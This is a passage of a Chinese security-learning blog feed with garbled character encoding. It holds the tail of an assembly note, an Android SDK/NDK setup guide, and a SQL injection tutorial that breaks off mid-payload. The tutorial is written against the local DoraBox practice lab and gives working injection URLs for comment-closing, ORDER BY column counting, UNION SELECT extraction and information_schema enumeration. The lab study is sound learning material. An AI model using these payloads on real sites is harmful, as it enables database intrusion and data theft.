ç›¸å½“äºï¼š"><a href="#push-espä»£ç ç›¸å½“äºï¼š" class="headerlink" title="push espä»£ç ç›¸å½“äºï¼š"></a>push espä»£ç ç›¸å½“äºï¼š</h5><p><code>mov dword ptr [esp-4],esp sub esp,0x4</code><br> è¿˜æœ‰ï¼š</p><p> <code>mov dword ptr [esp-4],esp  lea esp,dword ptr [esp-4]</code></p><h5 id="pop-eax-ä»£ç ç›¸å½“äºï¼š"><a href="#pop-eax-ä»£ç ç›¸å½“äºï¼š" class="headerlink" title="pop eax ä»£ç ç›¸å½“äºï¼š"></a>pop eax ä»£ç ç›¸å½“äºï¼š</h5><p><code>lea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4]</code></p><p><code>mov eax,dword ptr [esp] lea esp,dword ptr [esp+4]</code></p><h5 id="pop-esp-ä»£ç ç›¸å½“äºï¼š"><a href="#pop-esp-ä»£ç ç›¸å½“äºï¼š" class="headerlink" title="pop esp ä»£ç ç›¸å½“äºï¼š"></a>pop esp ä»£ç ç›¸å½“äºï¼š</h5><p><code>add esp,0x4 mov esp,dword ptr[esp-4]</code><br>æˆ–è€…</p><p><code>lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4]</code></p><h4 id="ä¸¤æ¡ç®€å•æŒ‡ä»¤"><a href="#ä¸¤æ¡ç®€å•æŒ‡ä»¤" class="headerlink" title="ä¸¤æ¡ç®€å•æŒ‡ä»¤"></a>ä¸¤æ¡ç®€å•æŒ‡ä»¤</h4><p>stos ï¼šå°†eaxä¸­çš„å€¼æ”¾å…¥ediæ‰€æŒ‡åœ°å€çš„å†…å­˜é‡Œã€‚</p><p>rep ï¼šæ˜¯é‡å¤æŒ‡ä»¤ ecxä¸­æ”¾å…¥é‡å¤çš„æ¬¡æ•°</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º</title>
    <link href="/2019/09/23/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/09/23/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>#å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º</p><h2 id="Macä¸‹å®‰å“SDKæ­å»ºï¼š"><a href="#Macä¸‹å®‰å“SDKæ­å»ºï¼š" class="headerlink" title="Macä¸‹å®‰å“SDKæ­å»ºï¼š"></a>Macä¸‹å®‰å“SDKæ­å»ºï¼š</h2><p>å‰ææ˜¯å·²ç»å®‰è£…äº†<strong>homebrew</strong>ç¥å™¨ï¼š</p><h3 id="1ï¼šä¸‹è½½SDK"><a href="#1ï¼šä¸‹è½½SDK" class="headerlink" title="1ï¼šä¸‹è½½SDK"></a>1ï¼šä¸‹è½½SDK</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">brew </span>search <span class="hljs-keyword">android-sdk</span><span class="hljs-keyword">brew </span>cask <span class="hljs-keyword">install </span><span class="hljs-keyword">android-sdk</span></code></pre></div><h3 id="2ï¼šé…ç½®ç¯å¢ƒå˜é‡"><a href="#2ï¼šé…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="2ï¼šé…ç½®ç¯å¢ƒå˜é‡"></a>2ï¼šé…ç½®ç¯å¢ƒå˜é‡</h3><div class="hljs"><pre><code class="hljs undefined">vim .zshrc<span class="hljs-builtin-name">export</span> <span class="hljs-attribute">ANDROID_SDK_ROOT</span>=<span class="hljs-string">"/usr/local/share/android-sdk"</span><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-string">"<span class="hljs-variable">$&#123;PATH&#125;</span>:<span class="hljs-variable">$&#123;ANDROID_SDK_ROOT&#125;</span>/tools:<span class="hljs-variable">$&#123;ANDROID_SDK_ROOT&#125;</span>/platform-tools"</span></code></pre></div><p><code>!wq</code>é€€å‡ºä»¥åï¼Œ<code>source ~/.zshrc</code></p><div class="hljs"><pre><code class="hljs undefined">pwd<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>android-sdk<span class="hljs-regexp">/tools/</span>bin.<span class="hljs-regexp">/sdkmanager</span></code></pre></div><p>ç„¶åä¼šå‡ºç°<code>Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.</code><br>ç»§ç»­<code>touch /Users/gjy/.android/repositories.cfg</code></p><h3 id="3ï¼šæ£€éªŒæ˜¯å¦æ­å»ºå¥½"><a href="#3ï¼šæ£€éªŒæ˜¯å¦æ­å»ºå¥½" class="headerlink" title="3ï¼šæ£€éªŒæ˜¯å¦æ­å»ºå¥½"></a>3ï¼šæ£€éªŒæ˜¯å¦æ­å»ºå¥½</h3><p>åœ¨ç»ˆç«¯è¾“å…¥ï¼š<code>android</code><br><img src="/2019/09/23/å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º/images/15692314399452.jpg" srcset="/img/loading.gif" alt="-w706"><br>è¿™å°±okäº†ã€‚</p><h2 id="å®‰å“NDKæ­å»º"><a href="#å®‰å“NDKæ­å»º" class="headerlink" title="å®‰å“NDKæ­å»º"></a>å®‰å“NDKæ­å»º</h2><p>å‰ææ˜¯å·²ç»å®‰è£…äº†<strong>homebrew</strong>ç¥å™¨ï¼š</p><h3 id="1ï¼šä¸‹è½½NDKï¼š"><a href="#1ï¼šä¸‹è½½NDKï¼š" class="headerlink" title="1ï¼šä¸‹è½½NDKï¼š"></a>1ï¼šä¸‹è½½NDKï¼š</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">brew </span>search <span class="hljs-keyword">android-ndk</span><span class="hljs-keyword">brew </span>cask <span class="hljs-keyword">install </span><span class="hljs-keyword">android-ndk</span></code></pre></div><h3 id="2ï¼šé…ç½®ç¯å¢ƒå˜é‡ï¼š"><a href="#2ï¼šé…ç½®ç¯å¢ƒå˜é‡ï¼š" class="headerlink" title="2ï¼šé…ç½®ç¯å¢ƒå˜é‡ï¼š"></a>2ï¼šé…ç½®ç¯å¢ƒå˜é‡ï¼š</h3><div class="hljs"><pre><code class="hljs undefined">vim <span class="hljs-string">.zshrc</span>export ANDROID_NDK_HOME=<span class="hljs-string">"/usr/local/share/android-ndk"</span>  <span class="hljs-string">//</span>æ·»åŠ è¿›å»æ­£å¸¸ä¿å­˜é€€å‡ºsource <span class="hljs-string">.zshrc</span></code></pre></div><h3 id="3ï¼šæ£€éªŒï¼š"><a href="#3ï¼šæ£€éªŒï¼š" class="headerlink" title="3ï¼šæ£€éªŒï¼š"></a>3ï¼šæ£€éªŒï¼š</h3><p><code>ndk-build</code><br><img src="/2019/09/23/å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º/images/15692340400478.jpg" srcset="/img/loading.gif" alt="-w751"><br>å·²ç»æˆåŠŸäº†ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLæ³¨å…¥åŸºç¡€å­¦ä¹ </title>
    <link href="/2019/09/01/SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/09/01/SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥åŸºç¡€å­¦ä¹ "><a href="#SQLæ³¨å…¥åŸºç¡€å­¦ä¹ " class="headerlink" title="SQLæ³¨å…¥åŸºç¡€å­¦ä¹ "></a>SQLæ³¨å…¥åŸºç¡€å­¦ä¹ </h1><h2 id="æ•°æ®ç±»å‹ï¼ˆæ•°å­—å‹ï¼‰"><a href="#æ•°æ®ç±»å‹ï¼ˆæ•°å­—å‹ï¼‰" class="headerlink" title="æ•°æ®ç±»å‹ï¼ˆæ•°å­—å‹ï¼‰"></a>æ•°æ®ç±»å‹ï¼ˆæ•°å­—å‹ï¼‰</h2><h3 id="æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ"><a href="#æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ" class="headerlink" title="æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ"></a>æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ</h3><h4 id="ä½¿ç”¨and-or-xor-likeæµ‹è¯•"><a href="#ä½¿ç”¨and-or-xor-likeæµ‹è¯•" class="headerlink" title="ä½¿ç”¨and,or,xor,likeæµ‹è¯•"></a>ä½¿ç”¨<code>and,or,xor,like</code>æµ‹è¯•</h4><ul><li>** 1=1</li><li>** 1=2<br>å…¶ä¸­<code>**</code>å¯ä»¥ä¸º<code>and or xor like</code>ä»»æ„ä¸€ä¸ªpsï¼šåŸºæœ¬è¯­å¥ï¼Œæ³¨æ„çœŸå‡é€»è¾‘å…³ç³»ï¼Œçµæ´»è¿›è¡Œæµ‹è¯•ã€‚</li></ul><h4 id="ä½¿ç”¨ç¬¦å·æµ‹è¯•"><a href="#ä½¿ç”¨ç¬¦å·æµ‹è¯•" class="headerlink" title="ä½¿ç”¨ç¬¦å·æµ‹è¯•"></a>ä½¿ç”¨ç¬¦å·æµ‹è¯•</h4><ul><li>å•å¼•å·</li><li>å‡å·</li></ul><h2 id="æ•°æ®ç±»å‹ï¼ˆå­—ç¬¦å‹ï¼‰"><a href="#æ•°æ®ç±»å‹ï¼ˆå­—ç¬¦å‹ï¼‰" class="headerlink" title="æ•°æ®ç±»å‹ï¼ˆå­—ç¬¦å‹ï¼‰"></a>æ•°æ®ç±»å‹ï¼ˆå­—ç¬¦å‹ï¼‰</h2><h3 id="æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ-1"><a href="#æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ-1" class="headerlink" title="æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ"></a>æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ</h3><p>æ­¤å¤„è·Ÿæ•°å­—å‹æµ‹è¯•åŠæ³•åŸºæœ¬ä¸€æ ·ï¼Œè¿˜æ˜¯ä½¿ç”¨<code>and,or,xor,like</code>ã€<code>å•å¼•å·</code>æµ‹è¯•ã€‚æœ€è¿‘æ¥è§¦å­—ç¬¦å‹çš„æ³¨å…¥è¾ƒå°‘ï¼Œè¡¥å……ä¸€ä¸‹åŸç†ï¼š</p><p>æˆ‘ä»¬å…ˆè¿›è¡Œæ­£å¸¸æŸ¥è¯¢ï¼š<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit</code><br>å½“æˆ‘ä»¬ç»™æ¥å—å¤„åŠ <code>&#39;</code>ï¼š<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit</code>è¯­å¥æ‰§è¡Œåï¼Œä¼šäº§ç”ŸæŠ¥é”™ï¼š<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673389579474.jpg" srcset="/img/loading.gif" alt><br>ç„¶åæˆ‘ä»¬æƒ³åŠæ³•ä¸è®©å…¶æŠ¥é”™ï¼Œå°±æ˜¯æ¥çœç•¥åé¢é‚£ä¸ªphpä»£ç è¯­å¥åŠ çš„<code>&#39;</code>:</p><ol><li>ç”¨<code>#</code>æ¥æ³¨é‡Šï¼Œä½†éœ€è¦è¿›è¡Œurlæ¥è½¬å˜ä¸€ä¸‹ä¸º<code>%23</code></li><li>ç”¨<code>--+</code> <code>--%20</code>æ¥æ³¨é‡Š<br>ç„¶åå°±å¯ä»¥æ¥ç”¨<code>and or xor like</code>æ¥æµ‹è¯•äº†ï¼Œä¾‹å¦‚ï¼š<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673394738908.jpg" srcset="/img/loading.gif" alt><br><code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673394874987.jpg" srcset="/img/loading.gif" alt></li></ol><h3 id="unionçŸ¥è¯†å°è®°"><a href="#unionçŸ¥è¯†å°è®°" class="headerlink" title="unionçŸ¥è¯†å°è®°"></a>unionçŸ¥è¯†å°è®°</h3><p>unionåœ¨é›†åˆä¸¤ä¸ªselectæŸ¥è¯¢è¯­å¥æ—¶ï¼Œä¸€å®šè¦æ³¨æ„<strong>ä¸¤ä¸ªæŸ¥è¯¢å‡ºæ¥çš„ç»“æœ,åˆ—æ•°ï¼ˆcolumnsï¼‰è¦ç›¸ç­‰æ‰ä¼šå‡ºæ¥ç»“æœã€‚</strong><br>ä¾‹å¦‚ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673411551995.jpg" srcset="/img/loading.gif" alt><br><code>SELECT * from news union SELECT 1,2;</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673412010749.jpg" srcset="/img/loading.gif" alt><br>æŠ¥é”™ï¼Œæ¢æˆ<code>SELECT * from news union SELECT 1,2,3;</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673412472041.jpg" srcset="/img/loading.gif" alt></p><h3 id="order-by-çŸ¥è¯†å°è®°"><a href="#order-by-çŸ¥è¯†å°è®°" class="headerlink" title="order by çŸ¥è¯†å°è®°"></a>order by çŸ¥è¯†å°è®°</h3><p><code>order by</code>æ˜¯æŒ‰ç…§ä¸€å®šè§„åˆ™æ¥è¿›è¡Œæ’åºçš„è¯­å¥ã€‚æˆ‘ä»¬ä¸ºä»€ä¹ˆèƒ½å¤Ÿé€šè¿‡<code>order by</code>æ’åºï¼Œæ¥æ’å‡ºæ¥åˆ—åæœ‰å¤šå°‘ä¸ªå‘¢ï¼Ÿæˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673428181899.jpg" srcset="/img/loading.gif" alt></p><p><code>SELECT * from test ORDER BY 1;</code><br>å½“æˆ‘ä»¬åœ¨æµ‹è¯•åˆ°<code>SELECT * from test ORDER BY 5;</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673428766361.jpg" srcset="/img/loading.gif" alt><br>å‘ç°å‡ºäº†å¼‚å¸¸ã€‚<br>æˆ‘ä»¬æ¢ä¸ª3åˆ—çš„è¡¨ï¼š<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673429298587.jpg" srcset="/img/loading.gif" alt><br>`SELECT * from news<br>ORDER BY 3;`æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„<br>`SELECT * from news<br>ORDER BY 4;`<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673429733420.jpg" srcset="/img/loading.gif" alt><br>æ‰€ä»¥å¯ä»¥<strong>å‘ç°æˆ‘ä»¬åœ¨<code>order by</code>ååŠ æ•°å­—å¯ä»¥æ¥æµ‹å‡ºæ¥ä¸€ä¸ªè¡¨çš„åˆ—åä¸ªæ•°ã€‚</strong></p><h3 id="æ˜¾ç¤ºè”åˆæŸ¥è¯¢å‡ºç°çš„ç»“æœ"><a href="#æ˜¾ç¤ºè”åˆæŸ¥è¯¢å‡ºç°çš„ç»“æœ" class="headerlink" title="æ˜¾ç¤ºè”åˆæŸ¥è¯¢å‡ºç°çš„ç»“æœ"></a>æ˜¾ç¤ºè”åˆæŸ¥è¯¢å‡ºç°çš„ç»“æœ</h3><p>æ˜¾ç¤ºæˆ‘ä»¬è‡ªå®šä¹‰æŸ¥è¯¢çš„ç»“æœï¼Œè¯¥æ€ä¹ˆå®ç°å‘¢ã€‚<br>å…ˆåœ¨é¶åœºæµ‹è¯•ï¼š<code>SELECT * FROM news WHERE id = 2 union select 1,2,3 from test</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673503130693.jpg" srcset="/img/loading.gif" alt></p><p>æ˜æ˜¾ç½‘é¡µæ˜¯ä¸ç»™æ˜¾ç¤ºçš„ã€‚ç›¸åŒè¯­å¥åœ¨æ•°æ®åº“ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673494870032.jpg" srcset="/img/loading.gif" alt><br>ä¸ç»™æ˜¾ç¤ºæ˜¯å› ä¸ºæœåŠ¡å™¨ç«¯phpä»£ç è¿›è¡Œäº†å¤„ç†ï¼Œåªå¯ä»¥æ˜¾ç¤ºå‡ºä¸€æ¡ç»“æœã€‚é‚£å¦‚æœæŠŠç¬¬ä¸€ä¸ªæŸ¥è¯¢ç»“æœç»™æ— æ³•æ˜¾ç¤ºï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥æ˜¾ç¤ºæˆ‘ä»¬è”åˆæŸ¥è¯¢çš„ç»“æœå‘¢ã€‚å…ˆåœ¨æ•°æ®åº“æµ‹è¯•ä¸‹SQLè¯­å¥ï¼š<code>SELECT * FROM news WHERE id = -1</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673498250797.jpg" srcset="/img/loading.gif" alt="-w430"><br>å‘ç°æ˜¯ä¸æ˜¾ç¤ºä¸œè¥¿çš„ã€‚ç»§ç»­æµ‹è¯•:<code>SELECT * FROM news WHERE id = -1 union select 1,2,3 from test;</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673498938620.jpg" srcset="/img/loading.gif" alt><br>æ¥ç€æˆ‘ä»¬æ‹¿åˆ°é¶åœºæµ‹è¯•ï¼š<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673503981645.jpg" srcset="/img/loading.gif" alt></p><p>è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„äº†ã€‚çœ‹è¿™ä¸ªé¡µé¢æ˜¾ç¤ºçš„æ•ˆæœ<code>2 3</code>ï¼Œåå‘æ€ç»´è€ƒè™‘æŠŠ<code>2 3</code>æ”¹æˆæˆ‘ä»¬çš„åˆ—åæ˜¯ä¸æ˜¯å°±å¯ä»¥å‡ºæ•°æ®äº†ï¼Œ<strong>ä½†æ˜¯æˆ‘ä»¬å¦‚ä½•çŸ¥é“è¡¨é‡Œçš„åˆ—åå‘¢ï¼Ÿ</strong></p><h3 id="existsï¼ˆï¼‰å‡½æ•°å°è®°"><a href="#existsï¼ˆï¼‰å‡½æ•°å°è®°" class="headerlink" title="existsï¼ˆï¼‰å‡½æ•°å°è®°"></a>existsï¼ˆï¼‰å‡½æ•°å°è®°</h3><p><code>exists()</code>æ˜¯éªŒè¯æŸä¸ªè¯­å¥æ˜¯å¦å­˜åœ¨ç»“æœï¼Œæ˜¯ä¸ªboolå‡½æ•°ï¼Œå­˜åœ¨æ˜¾ç¤º<code>1</code>åä¹‹æ˜¯<code>0</code>ã€‚<br><code>SELECT * FROM news WHERE id=1 and exists(select * from test);</code>åœ¨æ•°æ®åº“è¿›è¡Œæµ‹è¯•:<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673529496971.jpg" srcset="/img/loading.gif" alt><br><code>SELECT * FROM news WHERE id=1 and exists(select * from aa);</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673532051506.jpg" srcset="/img/loading.gif" alt><br>å‘ç°åœ¨ç”¨è¿™ä¸ªå‡½æ•°æŸ¥<strong>ä¸å­˜åœ¨çš„è¡¨</strong>çš„æ—¶å€™è¯­å¥æ˜¯æ²¡æ³•è¿›è¡Œçš„ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªè¯­å¥æ¥æ¨å‡ºè¡¨åå’Œåˆ—åï¼Œä¸è¿‡ååˆ†éº»çƒ¦ï¼Œ<strong>å¯ä»¥é€šè¿‡burpsuitæ¥è·‘</strong>ã€‚è¿˜æœ‰æ„å¤–æ”¶è·ï¼Œå¯ä»¥çœ‹å‡ºæ•°æ®åº“çš„åå­—<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673536538274.jpg" srcset="/img/loading.gif" alt><br>pentestå°±æ˜¯æ•°æ®åº“çš„åå­—äº†ã€‚</p><h2 id="æ•°æ®ç±»å‹ï¼ˆæœç´¢å‹ï¼‰"><a href="#æ•°æ®ç±»å‹ï¼ˆæœç´¢å‹ï¼‰" class="headerlink" title="æ•°æ®ç±»å‹ï¼ˆæœç´¢å‹ï¼‰"></a>æ•°æ®ç±»å‹ï¼ˆæœç´¢å‹ï¼‰</h2><h3 id="çš„ä½œç”¨"><a href="#çš„ä½œç”¨" class="headerlink" title="%çš„ä½œç”¨"></a><code>%</code>çš„ä½œç”¨</h3><p><code>%</code>åœ¨mysqlä¸­è¡¨ç¤ºé€šé…ç¬¦ã€‚åœ¨SQLè¯­å¥ä¸­:<br><code>******* like &#39;%a&#39;</code>ï¼Œå°±æ˜¯æœç´¢è¿”å›ä»¥å­—æ¯<code>a</code>ç»“å°¾çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒç†<code>a%</code>%a%`<code>,åˆ†åˆ«å°±æ˜¯ æœç´¢è¿”å›ä»¥å­—æ¯</code>a<code>å¼€å¤´çš„æ‰€æœ‰ä¿¡æ¯å’Œæœç´¢è¿”å›åŒ…å«å­—æ¯</code>a`çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><h3 id="å¦‚ä½•æ³¨å…¥"><a href="#å¦‚ä½•æ³¨å…¥" class="headerlink" title="å¦‚ä½•æ³¨å…¥"></a>å¦‚ä½•æ³¨å…¥</h3><p>å’±ä»¬å…ˆçœ‹ä¸‹phpæºä»£ç :<code>$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search</code><br>å¾ˆæ˜æ˜¾æå‰é—­åˆ<code>&#39;%</code>è·Ÿçœç•¥åé¢çš„<code>%&#39;</code>å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679129656049.jpg" srcset="/img/loading.gif" alt="-w804"></p><p>ç„¶åæˆ‘ä»¬æ­£å¸¸èµ°æ­¥éª¤ï¼Œåˆ©ç”¨<code>order by</code>æ¥ç¡®å®šä¸‹å¤šå°‘åˆ—ï¼š<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679138962766.jpg" srcset="/img/loading.gif" alt="-w840"><br>ç»§ç»­<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679139214321.jpg" srcset="/img/loading.gif" alt="-w1022"><br>å¯ä»¥ç¡®å®šæ˜¯3åˆ—äº†ã€‚</p><p>ç„¶åå¼€å§‹ç¡®å®šè¡¨åï¼Œè¿™æ¬¡ç”¨åˆšåˆšå­¦çš„exist()æ¥æµ‹è¯•ï¼Œå¹¶ä¸”ç»ƒä¹ ä¸€ä¸‹burpæ¥è·‘è¡¨åå’Œåˆ—åï¼š<br>å…ˆæ­£å¸¸æ„é€ payloadï¼š<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679141526795.jpg" srcset="/img/loading.gif" alt="-w843"><br>ç¡®å®šnewsè¡¨åå­˜åœ¨ï¼Œç„¶åå¼€å§‹ç”¨burpè·‘å…¶ä»–çš„ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679142504637.jpg" srcset="/img/loading.gif" alt="-w555"><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679143681990.jpg" srcset="/img/loading.gif" alt="-w837"><br>æˆ‘ä»¬æ˜¯è·‘è¡¨åï¼Œæ‰€ä»¥åœ¨<code>news</code>åŠ ä¸Šå˜é‡ã€‚è¿™ä¸ªæ­¥éª¤éœ€è¦å…ˆç‚¹<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679145034217.jpg" srcset="/img/loading.gif" alt="-w371"><br>ç„¶å<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679144276086.jpg" srcset="/img/loading.gif" alt="-w364"><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679145997135.jpg" srcset="/img/loading.gif" alt="-w531"><br>åœ¨â€œæ·»åŠ â€œæŒ‰é’®æ—çš„ä½ç½®å¼€å§‹å¡«å…¥æµ‹è¯•çš„è¡¨åï¼Œè¿™ä¸ªæˆ‘æ˜¯æ‰‹åŠ¨å¡«çš„ï¼Œå¯ä»¥è¿›è¡Œå¯¼å…¥å­—å…¸ã€‚<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679146928775.jpg" srcset="/img/loading.gif" alt="-w1260"><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679147050548.jpg" srcset="/img/loading.gif" alt="-w778"><br>ç„¶åæˆ‘ä»¬å¼€å§‹çœ‹ç»“æœ<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679147687971.jpg" srcset="/img/loading.gif" alt="-w666"><br><code>Render</code>ä¸‹é¢æ˜¾ç¤ºæ­£å¸¸å°±è¯æ˜æ˜¯å­˜åœ¨çš„ã€‚<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679148321357.jpg" srcset="/img/loading.gif" alt="-w963"><br>è¿™ä¸ªæ˜¯ä¸å­˜åœ¨ã€‚æœ€ç»ˆç”¨è¿™ä¸ªåŠæ³•å¯ä»¥è·‘å‡ºè¡¨å<code>testã€account</code>ã€‚åŒæ ·åŠæ³•è·‘åˆ—åï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679152029822.jpg" srcset="/img/loading.gif" alt="-w665"></p><p><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679151626020.jpg" srcset="/img/loading.gif" alt="-w797"><br>ç¡®å®šå‡º<code>news</code>è¡¨ä¸­æœ‰<code>idã€titleã€content</code>ç­‰åˆ—ã€‚</p><p>ç„¶åæˆ‘ä»¬æ›´æ–°ä¸‹è¯­å¥æ¥æŸ¥è¡¨å’Œåˆ—ï¼Œ<code>exists()</code>è¿™ä¸ªåŠæ³•æ˜¯æœ‰ç‚¹è€çš„æ¯”è¾ƒç¬¨ã€‚<strong>åœ¨MySQL&gt;5.1ç‰ˆæœ¬ä¸­</strong>ï¼Œ<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679322405278.jpg" srcset="/img/loading.gif" alt="-w764"><br>æˆ‘ä»¬å¯ä»¥åœ¨<code>information_schema</code>å‘ç°è¿™ä¸ªæˆ‘ä»¬çš„æ•°æ®åº“å’Œåˆ—åéƒ½å¯ä»¥ç›´æ¥çœ‹åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»¥ä¸‹è¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼š<br>ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬å…ˆè®©å…¶å¯ä»¥æ˜¾ç¤ºæˆ‘ä»¬æƒ³æŸ¥è¯¢çš„å†…å®¹<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679326036385.jpg" srcset="/img/loading.gif" alt="-w904"><br>æŠŠæ ‡é¢˜ä¸‹çš„<code>2</code>æ¢æˆ<code>darabase()</code>å‡½æ•°ï¼Œæ¥æ˜¾ç¤ºä¸‹æ•°æ®åº“çš„åå­—ã€‚<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679327628086.jpg" srcset="/img/loading.gif" alt="-w982"><br>ç„¶åæˆ‘ä»¬å°±çš„å¾—åˆ°äº†<code>pentest</code>ï¼Œç„¶åå¼€å§‹åˆ©ç”¨è¿™ä¸ªmysql&gt;5.1ç‰¹æ€§æ¥æ„é€ è¯­å¥ï¼š<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679330638311.jpg" srcset="/img/loading.gif" alt="-w902"><br>ä½†æ˜¯åœ¨è¿™é‡Œé¢æ€ä¹ˆæ˜¾ç¤ºå…¶ä»–çš„åå­—å‘¢ï¼Ÿ<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679331040602.jpg" srcset="/img/loading.gif" alt="-w523"><br>ç»§ç»­:<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and 